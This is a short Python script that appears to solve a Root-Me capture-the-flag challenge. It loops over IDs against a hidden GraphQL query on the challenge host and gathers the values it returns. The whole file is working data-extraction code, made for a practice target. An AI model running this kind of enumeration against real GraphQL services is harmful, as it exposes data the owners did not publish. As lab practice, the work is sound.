import requests

# chall: http://challenge01.root-me.org:59077
burp0_url = "http://challenge01.root-me.org:59077/rocketql"
burp0_cookies = {"_ga": "GA1.1.1837986058.1753151811", "_ga_SRYSKX09J7": "GS2.1.s1754008782$o3$g1$t1754008796$j46$l0$h0"}
burp0_headers = {"Accept-Language": "en-US,en;q=0.9", "Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Origin": "http://challenge01.root-me.org:59077", "Referer": "http://challenge01.root-me.org:59077/", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}

value = ''
for i in range(1, 100):
    burp0_json={"query": "query { IAmNotHere(very_long_id: " + str(i) + ") { very_long_id very_long_value }}"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    if "very_long_value" in r.text:
        data = r.text.split('"very_long_value":"')[1].split('"')[0]
        print(f"Found value for ID {i}: {data}")
        value += data
        print(f"Current accumulated value: {value}")